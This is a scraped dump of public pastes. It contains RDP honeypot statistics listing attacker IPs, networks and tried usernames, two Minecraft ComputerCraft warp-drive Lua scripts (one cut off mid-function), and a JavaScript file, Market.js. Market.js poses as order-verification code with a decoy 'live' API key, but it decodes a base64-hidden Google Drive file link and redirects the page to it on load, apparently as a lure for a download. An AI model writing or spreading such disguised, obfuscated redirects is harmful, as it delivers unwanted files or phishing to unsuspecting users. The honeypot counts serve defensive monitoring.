id,title,username,language,date,content
7FUgbXcD,2025-04-20_stats.json,rdp_snitch,JSON,Sunday 20th of April 2025 07:18:04 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 7155,
    ""80.94.95.198"": 57,
    ""71.82.170.60"": 30,
    ""88.214.50.50"": 9,
    ""211.185.207.14"": 33,
    ""159.89.6.147"": 1440,
    ""205.210.31.107"": 9,
    ""80.94.95.90"": 12,
    ""167.94.138.42"": 3,
    ""58.218.199.219"": 15,
    ""221.181.44.30"": 3,
    ""1.228.113.10"": 3,
    ""109.120.149.2"": 6,
    ""205.210.31.100"": 9,
    ""116.97.98.184"": 18,
    ""194.165.16.164"": 12,
    ""182.76.43.166"": 12,
    ""5.28.38.157"": 3,
    ""79.124.60.218"": 12,
    ""205.210.31.106"": 9,
    ""103.129.215.14"": 6,
    ""165.154.164.57"": 3,
    ""78.142.18.92"": 3,
    ""178.128.19.233"": 3,
    ""198.235.24.195"": 9,
    ""116.73.31.197"": 3
  },
  ""asn"": {
    ""AS212238"": 7155,
    ""AS204428"": 69,
    ""AS20115"": 30,
    ""Unknown"": 9,
    ""AS4766"": 33,
    ""AS14061"": 1443,
    ""AS396982"": 36,
    ""AS398324"": 3,
    ""AS4134"": 15,
    ""AS9808"": 3,
    ""AS9318"": 3,
    ""AS210644"": 6,
    ""AS24086"": 18,
    ""AS48721"": 12,
    ""AS9498"": 12,
    ""AS137811"": 3,
    ""AS50360"": 12,
    ""AS138192"": 6,
    ""AS135377"": 3,
    ""AS208046"": 3,
    ""AS17488"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 7155,
    ""SS-Net"": 69,
    ""Charter Communications"": 30,
    ""SIA \""Singularity Telecom\"""": 9,
    ""Korea Telecom"": 33,
    ""DigitalOcean, LLC"": 1443,
    ""Google LLC"": 36,
    ""Censys, Inc."": 3,
    ""Chinanet"": 15,
    ""China Mobile communications corporation"": 3,
    ""SK Broadband Co Ltd"": 3,
    ""Aeza International LTD"": 6,
    ""Viettel Corporation"": 18,
    ""Flyservers S.A."": 12,
    ""Bharti Airtel"": 12,
    ""BEE UNION (CAMBODIA) TELECOM CO"": 3,
    ""Tamatiya EOOD"": 12,
    ""Speed"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""ColocationX Ltd."": 3,
    ""Hathway IP over Cable Internet Access"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 7155,
    ""Unmanaged LTD"": 69,
    ""Spectrum"": 30,
    ""SIA \""Singularity Telecom\"""": 9,
    ""Kornet"": 33,
    ""DigitalOcean, LLC"": 1440,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc"": 3,
    ""Chinanet JS"": 15,
    ""China Mobile"": 3,
    ""broadNnet"": 3,
    ""Aeza International LTD"": 6,
    ""Viettel Group"": 18,
    ""Flyservers S.A"": 12,
    ""Bharti Airtel Ltd"": 12,
    ""BEE Union (cambodia) Telecom Co., LTD"": 3,
    ""Tamatiya EOOD"": 12,
    ""Unknown"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""ColocationX Ltd"": 3,
    ""Digitalocean"": 3,
    ""Hathway Cable and Datacom Limited"": 3
  },
  ""regionName"": {
    ""North West"": 7155,
    ""Budapest"": 69,
    ""Wisconsin"": 30,
    ""New York"": 9,
    ""Sejong-si"": 33,
    ""Hesse"": 1449,
    ""California"": 36,
    ""Michigan"": 3,
    ""Jiangsu"": 15,
    ""Guangdong"": 3,
    ""Chungcheongnam-do"": 3,
    ""Hanoi"": 18,
    ""Kaunas"": 12,
    ""Haryana"": 12,
    ""Phnom Penh"": 3,
    ""Plovdiv"": 12,
    ""Dhaka Division"": 6,
    ""North Holland"": 3,
    ""South West"": 3,
    ""Maharashtra"": 3
  },
  ""country"": {
    ""Singapore"": 7158,
    ""Hungary"": 69,
    ""United States"": 78,
    ""South Korea"": 36,
    ""Germany"": 1449,
    ""China"": 18,
    ""Vietnam"": 18,
    ""Lithuania"": 12,
    ""India"": 15,
    ""Cambodia"": 3,
    ""Bulgaria"": 12,
    ""Bangladesh"": 6,
    ""The Netherlands"": 3
  },
  ""account"": {
    ""hello"": 8655,
    ""142.93.8.59"": 120,
    ""Domain"": 9,
    ""ptIxVDVDI"": 3,
    ""qXTdzq"": 3,
    ""dhmOGT"": 3,
    ""Administr"": 15,
    ""(empty)"": 6,
    ""Test"": 21,
    ""EoBijqHTZ"": 3,
    ""UqCLhW"": 3,
    ""UGbwng"": 3,
    ""mgikaa3h"": 12,
    ""CFDzSdXiJ"": 3,
    ""jNcVOE"": 3,
    ""IcKuDq"": 3,
    ""Administrator"": 3,
    ""ygqHcqBGa"": 3,
    ""iWEACj"": 3,
    ""robFSx"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8877
  },
  ""client_build"": {
    ""Unknown"": 8877
  },
  ""client_name"": {
    ""Unknown"": 8877
  },
  ""ip_type"": {
    ""hosting & proxy"": 7155,
    ""Unknown"": 198,
    ""hosting"": 1494,
    ""proxy"": 15,
    ""mobile"": 15
  }
}"
UMaDD1pb,2025-04-20_stats.json,rdp_snitch,JSON,Sunday 20th of April 2025 07:16:14 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 4770,
    ""80.94.95.198"": 38,
    ""71.82.170.60"": 20,
    ""88.214.50.50"": 6,
    ""211.185.207.14"": 22,
    ""159.89.6.147"": 960,
    ""205.210.31.107"": 6,
    ""80.94.95.90"": 8,
    ""167.94.138.42"": 2,
    ""58.218.199.219"": 10,
    ""221.181.44.30"": 2,
    ""1.228.113.10"": 2,
    ""109.120.149.2"": 4,
    ""205.210.31.100"": 6,
    ""116.97.98.184"": 12,
    ""194.165.16.164"": 8,
    ""182.76.43.166"": 8,
    ""5.28.38.157"": 2,
    ""79.124.60.218"": 8,
    ""205.210.31.106"": 6,
    ""103.129.215.14"": 4,
    ""165.154.164.57"": 2,
    ""78.142.18.92"": 2,
    ""178.128.19.233"": 2,
    ""198.235.24.195"": 6,
    ""116.73.31.197"": 2
  },
  ""asn"": {
    ""AS212238"": 4770,
    ""AS204428"": 46,
    ""AS20115"": 20,
    ""Unknown"": 6,
    ""AS4766"": 22,
    ""AS14061"": 962,
    ""AS396982"": 24,
    ""AS398324"": 2,
    ""AS4134"": 10,
    ""AS9808"": 2,
    ""AS9318"": 2,
    ""AS210644"": 4,
    ""AS24086"": 12,
    ""AS48721"": 8,
    ""AS9498"": 8,
    ""AS137811"": 2,
    ""AS50360"": 8,
    ""AS138192"": 4,
    ""AS135377"": 2,
    ""AS208046"": 2,
    ""AS17488"": 2
  },
  ""isp"": {
    ""Datacamp Limited"": 4770,
    ""SS-Net"": 46,
    ""Charter Communications"": 20,
    ""SIA \""Singularity Telecom\"""": 6,
    ""Korea Telecom"": 22,
    ""DigitalOcean, LLC"": 962,
    ""Google LLC"": 24,
    ""Censys, Inc."": 2,
    ""Chinanet"": 10,
    ""China Mobile communications corporation"": 2,
    ""SK Broadband Co Ltd"": 2,
    ""Aeza International LTD"": 4,
    ""Viettel Corporation"": 12,
    ""Flyservers S.A."": 8,
    ""Bharti Airtel"": 8,
    ""BEE UNION (CAMBODIA) TELECOM CO"": 2,
    ""Tamatiya EOOD"": 8,
    ""Speed"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""ColocationX Ltd."": 2,
    ""Hathway IP over Cable Internet Access"": 2
  },
  ""org"": {
    ""Datacamp Limited"": 4770,
    ""Unmanaged LTD"": 46,
    ""Spectrum"": 20,
    ""SIA \""Singularity Telecom\"""": 6,
    ""Kornet"": 22,
    ""DigitalOcean, LLC"": 960,
    ""Palo Alto Networks, Inc"": 24,
    ""Censys, Inc"": 2,
    ""Chinanet JS"": 10,
    ""China Mobile"": 2,
    ""broadNnet"": 2,
    ""Aeza International LTD"": 4,
    ""Viettel Group"": 12,
    ""Flyservers S.A"": 8,
    ""Bharti Airtel Ltd"": 8,
    ""BEE Union (cambodia) Telecom Co., LTD"": 2,
    ""Tamatiya EOOD"": 8,
    ""Unknown"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""ColocationX Ltd"": 2,
    ""Digitalocean"": 2,
    ""Hathway Cable and Datacom Limited"": 2
  },
  ""regionName"": {
    ""North West"": 4770,
    ""Budapest"": 46,
    ""Wisconsin"": 20,
    ""New York"": 6,
    ""Sejong-si"": 22,
    ""Hesse"": 966,
    ""California"": 24,
    ""Michigan"": 2,
    ""Jiangsu"": 10,
    ""Guangdong"": 2,
    ""Chungcheongnam-do"": 2,
    ""Hanoi"": 12,
    ""Kaunas"": 8,
    ""Haryana"": 8,
    ""Phnom Penh"": 2,
    ""Plovdiv"": 8,
    ""Dhaka Division"": 4,
    ""North Holland"": 2,
    ""South West"": 2,
    ""Maharashtra"": 2
  },
  ""country"": {
    ""Singapore"": 4772,
    ""Hungary"": 46,
    ""United States"": 52,
    ""South Korea"": 24,
    ""Germany"": 966,
    ""China"": 12,
    ""Vietnam"": 12,
    ""Lithuania"": 8,
    ""India"": 10,
    ""Cambodia"": 2,
    ""Bulgaria"": 8,
    ""Bangladesh"": 4,
    ""The Netherlands"": 2
  },
  ""account"": {
    ""hello"": 5770,
    ""142.93.8.59"": 80,
    ""Domain"": 6,
    ""ptIxVDVDI"": 2,
    ""qXTdzq"": 2,
    ""dhmOGT"": 2,
    ""Administr"": 10,
    ""(empty)"": 4,
    ""Test"": 14,
    ""EoBijqHTZ"": 2,
    ""UqCLhW"": 2,
    ""UGbwng"": 2,
    ""mgikaa3h"": 8,
    ""CFDzSdXiJ"": 2,
    ""jNcVOE"": 2,
    ""IcKuDq"": 2,
    ""Administrator"": 2,
    ""ygqHcqBGa"": 2,
    ""iWEACj"": 2,
    ""robFSx"": 2
  },
  ""keyboard"": {
    ""Unknown"": 5918
  },
  ""client_build"": {
    ""Unknown"": 5918
  },
  ""client_name"": {
    ""Unknown"": 5918
  },
  ""ip_type"": {
    ""hosting & proxy"": 4770,
    ""Unknown"": 132,
    ""hosting"": 996,
    ""proxy"": 10,
    ""mobile"": 10
  }
}"
MuKVe9dy,集成尝试420背景,jaklsfjlsak,Lua,Sunday 20th of April 2025 07:15:48 PM CDT,"-- Set up colors: black text on light gray background
term.setTextColor(colors.black)
term.setBackgroundColor(colors.lightGray)
term.clear()  -- apply background to entire screen

print(""Press M to Activate Horizontal Mining System"")

print(""Press J to Activate Laser Guided Warp System"")

-- Restore default colors for pasted scripts if they rely on them
local function resetColors()
  term.setTextColor(colors.white)
  term.setBackgroundColor(colors.black)
end

if not fs.exists(""jzc"") then
  resetColors()
  shell.run(""pastebin get rfXW7SiN jzc"")
  term.clear()
  term.setTextColor(colors.black)
  term.setBackgroundColor(colors.lightGray)
end

if not fs.exists(""ztc"") then
  resetColors()
  shell.run(""pastebin get S9SW0zHJ ztc"")
  term.clear()
  term.setTextColor(colors.black)
  term.setBackgroundColor(colors.lightGray)
end

while true do
  local event, key = os.pullEvent(""key"")
  if key == keys.m then
    print(""Booting Horizontal Mining System..."")
    resetColors()
    shell.run(""jzc"")
    -- when it returns, restore our colors
    term.clear()
    term.setTextColor(colors.black)
    term.setBackgroundColor(colors.lightGray)
  elseif key == keys.j then
    print(""Booting Laser Guided Warp System..."")
    resetColors()
    shell.run(""ztc"")
    term.clear()
    term.setTextColor(colors.black)
    term.setBackgroundColor(colors.lightGray)
  end
end
"
d8CNqxnP,2025-04-20_stats.json,rdp_snitch,JSON,Sunday 20th of April 2025 07:15:08 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 2385,
    ""80.94.95.198"": 19,
    ""71.82.170.60"": 10,
    ""88.214.50.50"": 3,
    ""211.185.207.14"": 11,
    ""159.89.6.147"": 480,
    ""205.210.31.107"": 3,
    ""80.94.95.90"": 4,
    ""167.94.138.42"": 1,
    ""58.218.199.219"": 5,
    ""221.181.44.30"": 1,
    ""1.228.113.10"": 1,
    ""109.120.149.2"": 2,
    ""205.210.31.100"": 3,
    ""116.97.98.184"": 6,
    ""194.165.16.164"": 4,
    ""182.76.43.166"": 4,
    ""5.28.38.157"": 1,
    ""79.124.60.218"": 4,
    ""205.210.31.106"": 3,
    ""103.129.215.14"": 2,
    ""165.154.164.57"": 1,
    ""78.142.18.92"": 1,
    ""178.128.19.233"": 1,
    ""198.235.24.195"": 3,
    ""116.73.31.197"": 1
  },
  ""asn"": {
    ""AS212238"": 2385,
    ""AS204428"": 23,
    ""AS20115"": 10,
    ""Unknown"": 3,
    ""AS4766"": 11,
    ""AS14061"": 481,
    ""AS396982"": 12,
    ""AS398324"": 1,
    ""AS4134"": 5,
    ""AS9808"": 1,
    ""AS9318"": 1,
    ""AS210644"": 2,
    ""AS24086"": 6,
    ""AS48721"": 4,
    ""AS9498"": 4,
    ""AS137811"": 1,
    ""AS50360"": 4,
    ""AS138192"": 2,
    ""AS135377"": 1,
    ""AS208046"": 1,
    ""AS17488"": 1
  },
  ""isp"": {
    ""Datacamp Limited"": 2385,
    ""SS-Net"": 23,
    ""Charter Communications"": 10,
    ""SIA \""Singularity Telecom\"""": 3,
    ""Korea Telecom"": 11,
    ""DigitalOcean, LLC"": 481,
    ""Google LLC"": 12,
    ""Censys, Inc."": 1,
    ""Chinanet"": 5,
    ""China Mobile communications corporation"": 1,
    ""SK Broadband Co Ltd"": 1,
    ""Aeza International LTD"": 2,
    ""Viettel Corporation"": 6,
    ""Flyservers S.A."": 4,
    ""Bharti Airtel"": 4,
    ""BEE UNION (CAMBODIA) TELECOM CO"": 1,
    ""Tamatiya EOOD"": 4,
    ""Speed"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""ColocationX Ltd."": 1,
    ""Hathway IP over Cable Internet Access"": 1
  },
  ""org"": {
    ""Datacamp Limited"": 2385,
    ""Unmanaged LTD"": 23,
    ""Spectrum"": 10,
    ""SIA \""Singularity Telecom\"""": 3,
    ""Kornet"": 11,
    ""DigitalOcean, LLC"": 480,
    ""Palo Alto Networks, Inc"": 12,
    ""Censys, Inc"": 1,
    ""Chinanet JS"": 5,
    ""China Mobile"": 1,
    ""broadNnet"": 1,
    ""Aeza International LTD"": 2,
    ""Viettel Group"": 6,
    ""Flyservers S.A"": 4,
    ""Bharti Airtel Ltd"": 4,
    ""BEE Union (cambodia) Telecom Co., LTD"": 1,
    ""Tamatiya EOOD"": 4,
    ""Unknown"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""ColocationX Ltd"": 1,
    ""Digitalocean"": 1,
    ""Hathway Cable and Datacom Limited"": 1
  },
  ""regionName"": {
    ""North West"": 2385,
    ""Budapest"": 23,
    ""Wisconsin"": 10,
    ""New York"": 3,
    ""Sejong-si"": 11,
    ""Hesse"": 483,
    ""California"": 12,
    ""Michigan"": 1,
    ""Jiangsu"": 5,
    ""Guangdong"": 1,
    ""Chungcheongnam-do"": 1,
    ""Hanoi"": 6,
    ""Kaunas"": 4,
    ""Haryana"": 4,
    ""Phnom Penh"": 1,
    ""Plovdiv"": 4,
    ""Dhaka Division"": 2,
    ""North Holland"": 1,
    ""South West"": 1,
    ""Maharashtra"": 1
  },
  ""country"": {
    ""Singapore"": 2386,
    ""Hungary"": 23,
    ""United States"": 26,
    ""South Korea"": 12,
    ""Germany"": 483,
    ""China"": 6,
    ""Vietnam"": 6,
    ""Lithuania"": 4,
    ""India"": 5,
    ""Cambodia"": 1,
    ""Bulgaria"": 4,
    ""Bangladesh"": 2,
    ""The Netherlands"": 1
  },
  ""account"": {
    ""hello"": 2885,
    ""142.93.8.59"": 40,
    ""Domain"": 3,
    ""ptIxVDVDI"": 1,
    ""qXTdzq"": 1,
    ""dhmOGT"": 1,
    ""Administr"": 5,
    ""(empty)"": 2,
    ""Test"": 7,
    ""EoBijqHTZ"": 1,
    ""UqCLhW"": 1,
    ""UGbwng"": 1,
    ""mgikaa3h"": 4,
    ""CFDzSdXiJ"": 1,
    ""jNcVOE"": 1,
    ""IcKuDq"": 1,
    ""Administrator"": 1,
    ""ygqHcqBGa"": 1,
    ""iWEACj"": 1,
    ""robFSx"": 1
  },
  ""keyboard"": {
    ""Unknown"": 2959
  },
  ""client_build"": {
    ""Unknown"": 2959
  },
  ""client_name"": {
    ""Unknown"": 2959
  },
  ""ip_type"": {
    ""hosting & proxy"": 2385,
    ""Unknown"": 66,
    ""hosting"": 498,
    ""proxy"": 5,
    ""mobile"": 5
  }
}"
NbgVQe4e,Market.js,Epiphemeral,JavaScript,Sunday 20th of April 2025 07:08:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92470/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6HxWd6eE,默认飞船核心startup,jaklsfjlsak,Lua,Sunday 20th of April 2025 06:59:57 PM CDT,"if warpdriveCommons then os.unloadAPI(""warpdriveCommons"") end
if not os.loadAPI(""warpdrive/warpdriveCommons"") then error(""missing warpdriveCommons"") end
local w = warpdriveCommons.w

local data

----------- Ship support

local ship
local ship_front = 0
local ship_right = 0
local ship_up = 0
local ship_back = 0
local ship_left = 0
local ship_down = 0
local ship_isInHyper = false
local ship_x, ship_y, ship_z = 0, 0, 0
local ship_xTarget, ship_yTarget, ship_zTarget = 0, 0, 0
local ship_actualDistance = 0
local ship_energyRequired = 0
local ship_movement = { 0, 0, 0 }
local ship_rotationSteps = 0
local ship_indexPlayer = 0
local ship_arrayPlayers = { }
local ship_indexTarget = 0

function ship_read(parData)
  data = parData
end

function ship_name(parName)
  if ship == nil or ship.isInterfaced() == nil then
    return ''
  end
  return ship.name(parName)
end

function ship_boot()
  if ship == nil or ship.isInterfaced() == nil then
    return
  end
  
  w.setColorNormal()
  w.writeLn(""Booting Ship"")
  
  w.write(""- acquiring parameters: "")
  ship_front, ship_right, ship_up = ship.dim_positive()
  ship_back, ship_left, ship_down = ship.dim_negative()
  ship_isInHyper = ship.isInHyperspace()
  ship_movement = { ship.movement() }
  ship_rotationSteps = ship.rotationSteps()
  w.setColorSuccess()
  w.writeLn(""ok"")
  
  w.setColorNormal()
  w.write(""- checking assembly   : "")
  local timeout = 10
  local isValid, message
  repeat
    isValid, message = ship.getAssemblyStatus()
    w.sleep(0.05)
    timeout = timeout - 1
  until isValid == true or timeout < 0
  if timeout < 0 then
    w.setColorWarning()
    w.writeLn(""failed"")
    w.writeLn(message)
    w.setColorNormal()
    w.sleep(6)
    -- don't reboot as the player might need to set new dimensions to fix it
  else
    w.setColorSuccess()
    w.writeLn(""passed"")
  end
  w.sleep(0.2)
  
  w.setColorNormal()
  w.write(""- celestial position  : "")
  timeout = 10
  local pos
  repeat
    pos = ship.getLocalPosition()
    w.sleep(0.05)
    timeout = timeout - 1
  until pos ~= nil or timeout < 0
  if timeout < 0 then
    w.setColorWarning()
    w.writeLn(""failed"")
    w.writeLn("""")
    w.writeLn(""Something is wrong here, rebooting..."")
    w.setColorNormal()
    w.sleep(2)
    w.reboot()
  else
    w.setColorSuccess()
    w.writeLn(""triangulated"")
  end
  ship.command(""MANUAL"", false)
  ship_updateMovementStats()
  w.sleep(0.2)
  
  w.setColorNormal()
  w.write(""- integrity check     : "")
  timeout = 10
  local shipSize
  repeat
    shipSize = ship.getShipSize()
    w.sleep(0.05)
    timeout = timeout - 1
  until (shipSize ~= nil and shipSize ~= 0) or timeout < 0
  if timeout < 0 then
    w.setColorWarning()
    w.writeLn(""ongoing..."")
    w.setColorNormal()
    w.sleep(2)
  else
    w.setColorSuccess()
    w.writeLn(""passed"")
  end
  
  ship.enable(true)
  ship.command(""IDLE"", true)
  w.sleep(0.3)
end

function ship_writeMovement(prefix)
  local message = prefix
  local count = 0
  if ship_movement[1] > 0 then
    message = message .. w.format_integer(ship_movement[1]) .. "" front""
    count = count + 1
  elseif ship_movement[1] < 0 then
    message = message .. w.format_integer(- ship_movement[1]) .. "" back""
    count = count + 1
  end
  if ship_movement[2] > 0 then
    if count > 0 then message = message .. "", "" end
    message = message .. w.format_integer(ship_movement[2]) .. "" up""
    count = count + 1
  elseif ship_movement[2] < 0 then
    if count > 0 then message = message .. "", "" end
    message = message .. w.format_integer(- ship_movement[2]) .. "" down""
    count = count + 1
  end
  if ship_movement[3] > 0 then
    if count > 0 then message = message .. "", "" end
    message = message .. w.format_integer(ship_movement[3]) .. "" right""
    count = count + 1
  elseif ship_movement[3] < 0 then
    if count > 0 then message = message .. "", "" end
    message = message .. w.format_integer(- ship_movement[3]) .. "" left""
    count = count + 1
  end
  
  if ship_rotationSteps == 1 then
    if count > 0 then message = message .. "", "" end
    message = message .. ""Turn right""
    count = count + 1
  elseif ship_rotationSteps == 2 then
    if count > 0 then message = message .. "", "" end
    message = message .. ""Turn back""
    count = count + 1
  elseif ship_rotationSteps == 3 then
    if count > 0 then message = message .. "", "" end
    message = message .. ""Turn left""
    count = count + 1
  end
  
  if count == 0 then
    message = message .. ""(none)""
  end
  w.writeLn(message)
end

function ship_writeRotation()
  if ship_rotationSteps == 0 then
    w.writeLn("" Rotation         = Front    "")
  elseif ship_rotationSteps == 1 then
    w.writeLn("" Rotation         = Right +90"")
  elseif ship_rotationSteps == 2 then
    w.writeLn("" Rotation         = Back 180 "")
  elseif ship_rotationSteps == 3 then
    w.writeLn("" Rotation         = Left -90 "")
  end
end

function ship_updateMovementStats()
  -- get current position
  ship_x, ship_y, ship_z = ship.getLocalPosition()
  if ship_x == nil then
    ship_x, ship_y, ship_z = 0, 0, 0
  end
  
  -- compute movement
  local dx, dy, dz = ship.getOrientation()
  if dx == nil then
    dx, dy, dz = 0, 0, 0
  end
  local worldMovement = { x = 0, y = 0, z = 0 }
  worldMovement.x = dx * ship_movement[1] - dz * ship_movement[3]
  worldMovement.y = ship_movement[2]
  worldMovement.z = dz * ship_movement[1] + dx * ship_movement[3]
  ship_actualDistance = math.ceil(math.sqrt(worldMovement.x * worldMovement.x + worldMovement.y * worldMovement.y + worldMovement.z * worldMovement.z))
  ship_xTarget = ship_x + worldMovement.x
  ship_yTarget = ship_y + worldMovement.y
  ship_zTarget = ship_z + worldMovement.z
  
  -- update energy requirement
  local success, result = ship.getEnergyRequired()
  if success then
    ship_energyRequired = result
  else
    w.status_showWarning(result)
  end
end

function ship_warp()
  -- rs.setOutput(alarm_side, true)
  if w.input_readConfirmation(""Engage jump drive? (Y/n)"") then
    -- rs.setOutput(alarm_side, false)
    ship.command(""MANUAL"", false)
    ship.movement(ship_movement[1], ship_movement[2], ship_movement[3])
    ship.rotationSteps(ship_rotationSteps)
    ship.command(""MANUAL"", true)
    -- ship = nil
  end
  -- rs.setOutput(alarm_side, false)
end

function ship_page_setMovement(isByPosition)
  -- force manual jump so we get proper max jump distance
  ship.command(""MANUAL"", false)
  
  local success, maxJumpDistance = ship.getMaxJumpDistance()
  if success ~= true then
    w.status_showWarning("""" .. maxJumpDistance)
    return
  end
  
  w.page_begin(""<==== Set ship movement ====>"")
  w.setCursorPos(1, 3)
  w.setColorNormal()
  ship_writeMovement(""Current movement is "")
  w.setCursorPos(1, 5)
  
  local lenFB = math.abs(ship_front + ship_back  + 1)
  local lenUD = math.abs(ship_up    + ship_down  + 1)
  local lenLR = math.abs(ship_left  + ship_right + 1)
  if (isByPosition) then
    local dx, dy, dz = ship.getOrientation()
    if dx == nil then
      dx, dy, dz = 0, 0, 0
    end
    if dx == 0 then
      ship_movement[3] = -dz * ship_page_setDistanceAxis(4, ""X""           , ""East""   , ""West""    , ship_movement[3], lenLR, maxJumpDistance, ship_x)
      ship_movement[1] =  dz * ship_page_setDistanceAxis(6, ""Z""           , ""South""  , ""North""   , ship_movement[1], lenFB, maxJumpDistance, ship_z)
    else
      ship_movement[1] =  dx * ship_page_setDistanceAxis(4, ""X""           , ""East""   , ""West""    , ship_movement[1], lenFB, maxJumpDistance, ship_x)
      ship_movement[3] =  dx * ship_page_setDistanceAxis(6, ""Z""           , ""South""  , ""North""   , ship_movement[3], lenLR, maxJumpDistance, ship_z)
    end
    ship_movement[2] =         ship_page_setDistanceAxis(8, ""Y""           , ""Up""     , ""Down""    , ship_movement[2], lenUD, maxJumpDistance, ship_y)
  else
    ship_movement[1] =         ship_page_setDistanceAxis(4, ""Forward/back"", ""Forward"", ""Backward"", ship_movement[1], lenFB, maxJumpDistance, 0)
    ship_movement[2] =         ship_page_setDistanceAxis(6, ""Up/down""     , ""Up""     , ""Down""    , ship_movement[2], lenUD, maxJumpDistance, 0)
    ship_movement[3] =         ship_page_setDistanceAxis(8, ""Right/left""  , ""Right""  , ""Left""    , ship_movement[3], lenLR, maxJumpDistance, 0)
  end
  
  ship_movement = { ship.movement(ship_movement[1], ship_movement[2], ship_movement[3]) }
  ship_updateMovementStats()
end

function ship_page_setDistanceAxis(line, axis, positive, negative, userEntry, shipLength, maxJumpDistance, offset)
  local maximumDistance = math.floor(shipLength + maxJumpDistance)
  w.setCursorPos(1, line + 2)
  w.setColorHelp()
  w.writeFullLine("" Enter between "" .. w.format_integer(offset + math.floor( shipLength + 1)) .. "" and "" ..  w.format_integer(offset + maximumDistance) .. "" to move "" ..  positive .. ""."")
  w.writeFullLine("" Enter "" .. w.format_integer(offset) .. "" to keep position on this axis."")
  w.writeFullLine("" Enter between "" .. w.format_integer(offset - maximumDistance) .. "" and "" .. w.format_integer(offset + math.floor(-shipLength - 1)) .. "" to move "" ..  negative .. ""."")
  
  repeat
    w.setCursorPos(1, line)
    w.setColorNormal()
    w.write(axis .. "" movement: "")
    userEntry = w.input_readInteger(offset + userEntry)
    if math.abs(userEntry - offset) > maximumDistance then
      w.status_showWarning(""Wrong distance. Try again."")
    end
  until math.abs(userEntry - offset) <= maximumDistance
  w.setCursorPos(1, line + 2)
  w.clearLine()
  w.setCursorPos(1, line + 3)
  w.clearLine()
  w.setCursorPos(1, line + 4)
  w.clearLine()
  
  return userEntry - offset
end

function ship_page_setRotation()
  local inputAbort = false
  w.page_begin(""<==== Set ship rotation ====>"")
  w.setCursorPos(1, 8)
  w.setColorHelp()
  w.writeFullLine("" Select ship rotation (Up, Down, Left, Right)."")
  w.writeFullLine("" Select Front to keep current orientation."")
  w.writeFullLine("" Press Enter to save your selection."")
  repeat
    w.setCursorPos(1, 3)
    w.setColorNormal()
    ship_writeRotation()
    local params = { os.pullEventRaw() }
    local eventName = params[1]
    local address = params[2]
    if address == nil then address = ""none"" end
    if eventName == ""key"" then
      local keycode = params[2]
      if keycode == 200 then
        ship_rotationSteps = 0
      elseif keycode == 203 then
        ship_rotationSteps = 3
      elseif keycode == 205 then
        ship_rotationSteps = 1
      elseif keycode == 208 then
        ship_rotationSteps = 2
      elseif keycode == 28 then
        inputAbort = true
      else
        w.status_showWarning(""Key code "" .. w.format_integer(keycode) .. "" is invalid"")
      end
    elseif eventName == ""terminate"" then
      inputAbort = true
    elseif not w.event_handler(eventName, params[2]) then
      w.status_showWarning(""Event '"" .. eventName .. ""', "" .. address .. "" is unsupported"")
    end
  until inputAbort
  ship_rotationSteps = ship.rotationSteps(ship_rotationSteps)
end

function ship_page_setDimensions()
  w.page_begin(""<==== Set ship dimensions ====>"")
  w.setCursorPos(1, 14)
  w.setColorHelp()
  w.writeFullLine("" Enter ship size in blocks (0-9)."")
  w.writeFullLine("" First block next to Ship counts as 1."")
  w.writeFullLine("" "")
  w.writeFullLine("" Press Enter to save your selection."")
  
  w.setCursorPos(1, 3)
  w.setColorNormal()
  w.write("" Front ("".. w.format_integer(ship_front) .."") : "")
  ship_front = w.input_readInteger(ship_front)
  w.write("" Right ("".. w.format_integer(ship_right) .."") : "")
  ship_right = w.input_readInteger(ship_right)
  w.write("" Up    ("".. w.format_integer(ship_up) .."") : "")
  ship_up = w.input_readInteger(ship_up)
  w.write("" Back  ("".. w.format_integer(ship_back) .."") : "")
  ship_back = w.input_readInteger(ship_back)
  w.write("" Left  ("".. w.format_integer(ship_left) .."") : "")
  ship_left = w.input_readInteger(ship_left)
  w.write("" Down  ("".. w.format_integer(ship_down) .."") : "")
  ship_down = w.input_readInteger(ship_down)
  w.write(""Setting dimensions..."")
  ship_front, ship_right, ship_up = ship.dim_positive(ship_front, ship_right, ship_up)
  ship_back, ship_left, ship_down = ship.dim_negative(ship_back, ship_left, ship_down)
end

function ship_page_summon() -- no longer used
  w.page_begin(""<==== Summon players ====>"")
  local stringPlayers = ship.getAttachedPlayers()
  if stringPlayers == """" then
    w.writeLn(""~ no players registered ~"")
    w.writeLn("""")
    w.setColorHelp()
    w.writeFullLine("" Press enter to exit."")
    w.setColorNormal()
    w.input_readInteger("""")
    return
  end
  local arrayPlayers = w.data_splitString(stringPlayers, "","")
  for i = 1, #arrayPlayers do
    w.writeLn(i .. "". "" .. arrayPlayers[i])
  end
  w.setColorHelp()
  w.writeFullLine("" Enter player number"")
  w.writeFullLine("" or press enter to summon everyone."")
